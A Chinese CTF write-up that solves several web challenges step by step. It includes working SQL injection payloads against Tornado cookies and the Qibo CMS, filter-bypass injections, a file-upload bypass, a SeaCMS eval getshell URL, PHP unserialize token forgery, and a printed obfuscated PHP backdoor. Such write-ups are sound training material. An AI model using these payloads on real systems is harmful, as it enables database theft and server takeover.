<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">&#x27;r0ker&#x27;</span></span><br><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">from</span> function <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> db</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> URL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LockHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">		self.set_secure_cookie(<span class="string">&quot;lock&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">		self.render(<span class="string">&quot;lock.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">post</span>(<span class="params">self</span>):</span></span><br><span class="line">		username = self.get_secure_cookie(<span class="string">&quot;username&quot;</span>) <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">		passwd = md5(self.get_argument(<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">		row = db.ct(<span class="string">&quot;manager&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;username=&#x27;&quot;</span>+ username +<span class="string">&quot;&#x27;and password=&#x27;&quot;</span>+ passwd +<span class="string">&quot;&#x27;&quot;</span>)</span><br><span class="line">		<span class="keyword">if</span> row:</span><br><span class="line">			self.set_secure_cookie(<span class="string">&quot;lock&quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">			self.redirect(<span class="string">&quot;http://&quot;</span> + URL)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			self.redirect(<span class="string">&quot;http://&quot;</span> + URL + <span class="string">&quot;/lock&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>而 <code>set_secure_cookie</code> 方法来自 <code>tornado</code>，该方法使用一个 <code>cookie_secret</code> 来加密 <code>cookie</code>。我们可以在 <code>index.py</code> 中发现这个 <code>cookie_secret</code>：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">settings = &#123;</span><br><span class="line">	<span class="string">&quot;static_path&quot;</span>: os.path.join(os.path.dirname(__file__), <span class="string">&quot;themes/static&quot;</span>),</span><br><span class="line">	<span class="string">&quot;template_path&quot;</span>: os.path.join(os.path.dirname(__file__), <span class="string">&quot;themes&quot;</span>),</span><br><span class="line">	<span class="string">&quot;cookie_secret&quot;</span>: <span class="string">&quot;M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=&quot;</span>,</span><br><span class="line">	<span class="string">&quot;login_url&quot;</span>: <span class="string">&quot;/login&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以，我们在注入的时候，只需要将 payload 用 <code>cookie_secret</code> 加密即可。借助 <code>tornado</code> 写个脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.web</span><br><span class="line"><span class="keyword">import</span> tornado.ioloop</span><br><span class="line"></span><br><span class="line">settings = &#123;</span><br><span class="line">  <span class="string">&#x27;cookie_secret&#x27;</span>: <span class="string">&#x27;M0ehO260Qm2dD/MQFYfczYpUbJoyrkp6qYoI2hRw2jc=&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">    self.write(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">    <span class="comment"># self.set_secure_cookie(&#x27;username&#x27;, &quot;&#x27; and updatexml(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#&quot;)</span></span><br><span class="line">    <span class="comment"># self.set_secure_cookie(&#x27;username&#x27;, &quot;&#x27; and updatexml(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name=&#x27;manager&#x27;),0x7e),1)#&quot;)</span></span><br><span class="line">    <span class="comment"># self.set_secure_cookie(&#x27;username&#x27;, &quot;&#x27; and updatexml(1,concat(0x7e, (select group_concat(username,&#x27;||&#x27;,password,&#x27;||&#x27;,email) from manager),0x7e),1)#&quot;)</span></span><br><span class="line">    self.set_secure_cookie(<span class="string">&#x27;username&#x27;</span>, <span class="string">&quot;&#x27; and updatexml(1,concat(0x7e, mid((select group_concat(username,&#x27;||&#x27;,password,&#x27;||&#x27;,email) from manager),30,40),0x7e),1)#&quot;</span>)</span><br><span class="line">    self.write(self.get_secure_cookie(<span class="string">&#x27;username&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">makeapp</span>():</span></span><br><span class="line">  <span class="keyword">return</span> tornado.web.Application([</span><br><span class="line">    (<span class="string">r&#x27;/index&#x27;</span>, MainHandler),</span><br><span class="line">  ], **settings)</span><br><span class="line"></span><br><span class="line">app = makeapp()</span><br><span class="line">app.listen(<span class="number">8089</span>)</span><br><span class="line">tornado.ioloop.IOLoop.instance().start()</span><br></pre></td></tr></table></figure>


<p>浏览器访问本机 8089 端口，在返回头 <code>Set-Cookie</code> 中得到加密后的注入语句，带着这个 cookie 访问网页的 <code>/lock</code>（而不是 <code>/login</code>）。在爆用户名、密码和邮箱时，显示长度有限制，因此需要分两次用 <code>mid</code> 截取，最终得到用户名、密码和邮箱为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ichuqiu||318a61264482e503090facfc4337207f||545</span><br></pre></td></tr></table></figure>
<p>密码经过 MD5 解密得到：<code>Myxss623</code>。登录在后台发现 <code>f13g_ls_here.txt</code> 文件，继续通过注入读取该文件。将代码中 <code>set_secure_cookie</code> 的第二个参数改为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#39; and updatexml(1,concat(0x7e, (select load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;fl3g_ls_here.txt&#39;)),0x7e),1)#&quot;</span><br></pre></td></tr></table></figure>
<p>然后故技重施，由于长度限制只得到一部分 flag，再修改 payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#39; and updatexml(1,concat(0x7e, mid((select load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;f13g_ls_here.txt&#39;)),30,40),0x7e),1)#&quot;</span><br></pre></td></tr></table></figure>
<p>即可得到第二部分。</p>
<h2 id="再见-CMS"><a href="#再见-CMS" class="headerlink" title="再见 CMS"></a>再见 CMS</h2><p>根据登录页面页脚可以判断出该 CMS 为齐博 CMS。<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33020901/article/details/52593063">漏洞参考</a>，很巧妙地利用了转义进行 SQL 注入。</p>
<p>根据参考的文章，先注册一个用户，然后去会员中心修改个人信息，可以看到表单中每一项对应什么参数。然后构造 payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;member&#x2F;userinfo.php?job&#x3D;edit&amp;step&#x3D;2</span><br></pre></td></tr></table></figure>
<p>POST 数据：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truename&#x3D;xxxx%0000&amp;Limitword[000]&#x3D;&amp;email&#x3D;123456@qq.com&amp;provinceid&#x3D;,address&#x3D;(select database()) where uid&#x3D;3#</span><br></pre></td></tr></table></figure>
<p>首先 <code>uid</code> 对应自己账户的 <code>uid</code>，在个人信息处可以在 url 中看到。注入的具体原理参考 “漏洞参考” 文章，注入点是参数 <code>provinceid</code>，注意不是 <code>address</code>。</p>
<p>这样可以在个人信息页面的 “联系地址” 一栏得到数据库名 <code>blog</code>。接下来爆表名：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truename&#x3D;xxxx%0000&amp;Limitword[000]&#x3D;&amp;email&#x3D;123456@qq.com&amp;provinceid&#x3D;,address&#x3D;(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) where uid&#x3D;3#</span><br></pre></td></tr></table></figure>
<p>我们关心的是表 <code>admin</code>。爆列名，注意单双引号会被转义所以不能使用，可以用十六进制绕过：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truename&#x3D;xxxx%0000&amp;Limitword[000]&#x3D;&amp;email&#x3D;123456@qq.com&amp;provinceid&#x3D;,address&#x3D;(select group_concat(column_name) from information_schema.columns where table_name&#x3D;0x61646d696e) where uid&#x3D;3#</span><br></pre></td></tr></table></figure>
<p>爆用户名和密码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truename&#x3D;xxxx%0000&amp;Limitword[000]&#x3D;&amp;email&#x3D;123456@qq.com&amp;provinceid&#x3D;,address&#x3D;(select group_concat(username,0x7e,password) from admin) where uid&#x3D;3#</span><br></pre></td></tr></table></figure>
<p>得到用户名 <code>admin</code>，密码 MD5 <code>2638127c92b79ee7901195382dc08068</code>，普通 MD5 网站解不出来，在 <code>https://hashkiller.co.uk/Cracker</code> 和 <code>http://www.chamd5.org/</code> 上破解出来是 <code>4b10b488e4c8</code>，但是用这个密码登录不了，可能方向错了吧。</p>
<p>无奈只能扫下目录发现 <code>flag.php</code>，然后利用 SQL 读文件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">truename&#x3D;xxxx%0000&amp;Limitword[000]&#x3D;&amp;email&#x3D;123456@qq.com&amp;provinceid&#x3D;,address&#x3D;(select load_file(0x2f7661722f7777772f68746d6c2f666c61672e706870)) where uid&#x3D;3#</span><br></pre></td></tr></table></figure>

<p>发现联系地址这次变成了空白，F12 得到 <code>flag.php</code> 源码从而得到 flag。</p>
<h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2><p>过滤了很多关键字，绕过技巧是用 <code>&lt;&gt;</code> 来分割：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 o&lt;&gt;rder by 1</span><br></pre></td></tr></table></figure>
<p>发现 <code>by 4</code> 的时候无回显但 <code>by 3</code> 的时候有，说明共 3 列。</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1 union se&lt;&gt;lect 1,2,3</span><br></pre></td></tr></table></figure>
<p>得到回显 <code>2</code>。接下来正常注入：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id=1 union se&lt;&gt;lect 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()</span><br><span class="line"><span class="comment">-- info, users</span></span><br><span class="line">id=1 union se&lt;&gt;lect 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;info&#x27;</span><br><span class="line"><span class="comment">-- id,title,flAg_T5ZNdrm</span></span><br><span class="line">id=1 union se&lt;&gt;lect 1,flAg_T5ZNdrm,3 from info</span><br><span class="line"><span class="comment">-- flag&#123;...&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h2><p>F12 发现 <code>login.php?id=1</code>，但是这里好像注入不了。</p>
<p>回到前页，发现页面是由 <code>index.php</code> 302 跳转来的，因此检查一下对于 <code>index.php</code> 的请求的返回头，发现了特殊字段 <code>page</code>，得到真正的登陆页面 <code>l0gin.php?id=1</code>。</p>
<p>这个 <code>id</code> 可以注入，但是存在逗号截断，因此需要在没有逗号的情况下注入，这里很容易想到 <code>join</code>。先 <code>order by</code> 注入，得到列数为 2。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39; order by 3%23</span><br></pre></td></tr></table></figure>
<p>尝试一下 <code>join</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1&#39;union select * from (select 1)a join (select 2)b%23</span><br></pre></td></tr></table></figure>
<p>发现还是正常返回 <code>1,flag</code>，因为网页上限制了只能显示一条记录，而 <code>id=1</code> 的查询是成功的，因此后面我们 <code>union</code> 的结果没有回显出来。因此只需要让 <code>id=3</code> 使得查询不到 <code>username</code> 即可。</p>
<p>最后正常注入：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;3&#39;union select * from (select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())b%23</span><br><span class="line"></span><br><span class="line">id&#x3D;3&#39;union select * from (select 1)a join (select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;)b%23</span><br><span class="line"></span><br><span class="line">id&#x3D;3&#39;union select * from (select 1)a join (select flag_9c861b688330 from users)b%23</span><br></pre></td></tr></table></figure>

<h2 id="123"><a href="#123" class="headerlink" title="123"></a>123</h2><p>F12 得到 <code>user.php</code> 和用户默认密码，下载 <code>user.php.bak</code>，打开得到一堆用户名。Intruder 用 <code>BatteringRam</code> 模式爆破用户名密码，登陆后 F12 得到：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 存在漏洞需要去掉  --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- &lt;form action=&quot;&quot;method=&quot;POST&quot;enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="comment">	&lt;input type=&quot;file&quot;name=&quot;file&quot;/&gt;</span></span><br><span class="line"><span class="comment">	&lt;input type=&quot;submit&quot;name=&quot;submit&quot;value=&quot; 上传 &quot;/&gt;</span></span><br><span class="line"><span class="comment">&lt;/form&gt; --&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里猜测是文件上传漏洞。恢复前端代码后随便选个文件上传，发现只能传图片文件，因此修改 <code>Content-Type</code> 和文件内容。<code>Content-Type</code> 设置为 <code>image/png</code>，文件内容中写入 PNG 文件头 <code>PNG</code>。然后将文件名改为 <code>1.png.php</code>，但是提示 <code> 文件名不能包含 php</code>。</p>
<p>因此尝试 <code>1.png.pht</code> 绕过，得到页面 <code>view.php</code>。只有一个提示 <code>file?</code>，尝试传入 GET 参数 <code>file=flag</code>，得到提示 <code>filter &#39;flag&#39;</code>，于是双写绕过。</p>
<h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><p>海洋 CMS 很老的漏洞，<a target="_blank" rel="noopener" href="http://0day5.com/archives/4180/">漏洞详情</a>。</p>
<p>直接蚁剑连接 <code>/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[1])</code> 来 getshell。但是没有找到 flag。</p>
<p>到 <code>/var/www/html/data/common.inc.php</code> 找到数据库配置：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 数据库连接信息</span></span><br><span class="line">$cfg_dbhost = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">$cfg_dbname = <span class="string">&#x27;seacms&#x27;</span>;</span><br><span class="line">$cfg_dbuser = <span class="string">&#x27;sea_user&#x27;</span>;</span><br><span class="line">$cfg_dbpwd = <span class="string">&#x27;46e06533407e&#x27;</span>;</span><br><span class="line">$cfg_dbprefix = <span class="string">&#x27;sea_&#x27;</span>;</span><br><span class="line">$cfg_db_language = <span class="string">&#x27;utf8&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在蚁剑中选择 <code>数据操作</code>，然后输入上面的配置信息，可以在 <code>seacms</code> 数据库的 <code>flag_140ad2e0d8cb</code> 表中执行 SQL 语句得到 flag。</p>
<h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>F12 中提示账户密码都为 <code>test1</code>，登录后在响应头中发现 <code>show</code> 字段，把 0 在请求头改成 1 试试，发现注释中返回了源码。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span> <span class="string">&#x27;common.php&#x27;</span>;</span><br><span class="line">	$requset = array_merge($_GET, $_POST, $_SESSION, $_COOKIE);</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">db</span></span></span><br><span class="line"><span class="class">	</span>&#123;</span><br><span class="line">		<span class="keyword">public</span> $where;</span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;where))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;select(<span class="keyword">$this</span>-&gt;where);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params">$where</span>)</span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			$sql = mysql_query(<span class="string">&#x27;select * from user where&#x27;</span>.$where);</span><br><span class="line">			<span class="keyword">return</span> @mysql_fetch_array($sql);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($requset[<span class="string">&#x27;token&#x27;</span>]))</span><br><span class="line">	&#123;</span><br><span class="line">		$login = unserialize(gzuncompress(base64_decode($requset[<span class="string">&#x27;token&#x27;</span>])));</span><br><span class="line">		$db = <span class="keyword">new</span> db();</span><br><span class="line">		$row = $db-&gt;select(<span class="string">&#x27;user=\&#x27;&#x27;</span>.mysql_real_escape_string($login[<span class="string">&#x27;user&#x27;</span>]).<span class="string">&#x27;\&#x27;&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span>($login[<span class="string">&#x27;user&#x27;</span>] ===<span class="string">&#x27;ichunqiu&#x27;</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> $flag;</span><br><span class="line">		&#125;<span class="keyword">else</span> <span class="keyword">if</span>($row[<span class="string">&#x27;pass&#x27;</span>] !== $login[<span class="string">&#x27;pass&#x27;</span>])&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&#x27;unserialize injection!!&#x27;</span>;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;(╯‵□′)╯︵┴─┴ &quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: index.php?error=1&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>这里需要以 <code>ichunqiu</code> 登录，关键就在于那个反序列化的过程。而且，<code>array_merge</code> 合并时，遇到相同的键取最后的那个值。</p>
<p>写个脚本生成需要的 <code>token</code>，然后放在 cookie 里发送就好了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $a = <span class="keyword">array</span>(<span class="string">&#x27;user&#x27;</span> =&gt; <span class="string">&#x27;ichunqiu&#x27;</span>);</span><br><span class="line">  <span class="keyword">echo</span> base64_encode(gzcompress(serialize($a)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="Backdoor"><a href="#Backdoor" class="headerlink" title="Backdoor"></a>Backdoor</h2><p>扫目录发现 <code>.git</code> 泄露。上 GitHack 把 <code>.git</code> 下载下来，然后发现需要回退。</p>
<p>值得记录的是 GitHack 好像没能把 <code>.git</code> 下下来，只能下载所有文件，因此我使用了 <code>dvcs ripper</code> 这个工具：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./rip-git.pl -v -u http://1355bb65468a451b9487c15dba117690cff7627b879e42f2.</span><br><span class="line">changame.ichunqiu.com/Challenges/.git/</span><br></pre></td></tr></table></figure>

<p>访问 <code>/Challenges/.git/logs/HEAD</code> 可以查看提交记录，或者也可以 <code>git log</code> 查看。随后回退到之前的版本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard 12c6ddf4af0a5542c1cf6a9ab19b4231c1fd9a88</span><br><span class="line">cat flag.php</span><br></pre></td></tr></table></figure>
<p>这时可以看到，<code>flag.php</code> 内容变为：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag&#123;true_flag_is_in_the_b4ckdo0r.php&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>那么我们继续访问 <code>b4ckdo0r.php</code>，提示要找出其源码。这种一般都存在备份文件里，例如 <code>vim</code> 中的 <code>.swo</code> 和 <code>.swp</code>，逐一尝试得备份文件 <code>.b4ckdo0r.php.swp</code>，用 <code>vim -r</code> 恢复：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;can you find the source code of me?&quot;</span>;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Signature For Report</span></span><br><span class="line"><span class="comment"> */</span>$h=<span class="string">&#x27;_)m/&quot;,&quot;/-/)m&quot;),)marray()m&quot;/&quot;,&quot;+&quot;)m),$)mss($s[$i)m],0,$e))))m)m,$k)));$o=ob)m_get_c)monte)m)mnts)m();ob_end_clean)&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$H=<span class="string">&#x27;m();$d=ba)mse64)m_encode)m(x(gzc)mompres)ms($o),)m$)mk));print(&quot;&lt;)m$k&gt;$d&lt;)m/)m$k&gt;)m&quot;);@sessio)mn_d)mestroy();&#125;&#125;&#125;&#125;&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$N=<span class="string">&#x27;mR;$rr)m=@$r[)m&quot;HTT)mP_RE)mFERER&quot;];$ra)m=)m@$r[&quot;HTTP_AC)mC)mEPT_LANG)mUAGE)m&quot;)m];if($rr)m&amp;&amp;$ra)&#123;)m$u=parse_u)mrl($rr);p&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$u=<span class="string">&#x27;$e)&#123;)m$k=$)mkh.$kf;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array(&quot;/&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$f=<span class="string">&#x27;$i&lt;$)ml;)m)&#123;)mfo)mr($j)m=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j)m++,$i+)m+)&#123;$)mo.=$t&#123;$i)m&#125;^$)mk&#123;$j&#125;;&#125;&#125;r)meturn )m$o;&#125;$r)m=$_SERVE)&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$O=<span class="string">&#x27;[$i]=&quot;&quot;;$p)m=$)m)mss($p,3)m);&#125;if(ar)mray_)mkey_exists)m()m$i,$s))&#123;$)ms[$i].=$p)m;)m$e=s)mtrpos)m($s[$i],$f);)mif(&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$w=<span class="string">&#x27;)m));)m$p=&quot;&quot;;fo)mr($z=1;)m$z&lt;c)mount()m$m[1]);$)mz++)m)m)$p.=$q[$m[)m)m2][$z]];if(str)mpo)ms($p,$h))m===0)&#123;$s)m&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$P=<span class="string">&#x27;trt)molower&quot;;$)mi=$m[1][0)m)m].$m[1][1])m;$h=strtolower()msubstr(m)md5($)mi.$kh)m),0,)m3));$f=$s)ml(substr()m)mmd5($i.$kf),0,3&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$i=<span class="string">&#x27;)marse_)mstr)m($u[&quot;q)muery&quot;],$)m)mq);$q=array)m_values()m$q);pre)mg_matc)mh_all()m&quot;/([\\w)m])m)[\\w-)m]+(?:;q=0.)&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$x=<span class="string">&#x27;m([\\d)m]))?,?/&quot;,)m$ra,$m))m;if($q)m&amp;&amp;$)mm))m)m&#123;@session_start();$)ms=&amp;$_S)mESSI)m)mON;$)mss=&quot;sub)mstr&quot;;strtolower=&quot;s)m&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$y=str_replace(<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;crbebbabte_funcbbtion&#x27;</span>);<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$c=<span class="string">&#x27;$kh=&quot;4f7)m)mf&quot;;$kf=&quot;2)m)m8d7&quot;;funct)mion x($t)m,$k)&#123;$)m)mc=strlen($k);$l=st)mrlen)m($t);)m)m$o=&quot;&quot;;for()m$i=0;&#x27;</span>;<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$L=str_replace(<span class="string">&#x27;)m&#x27;</span>,<span 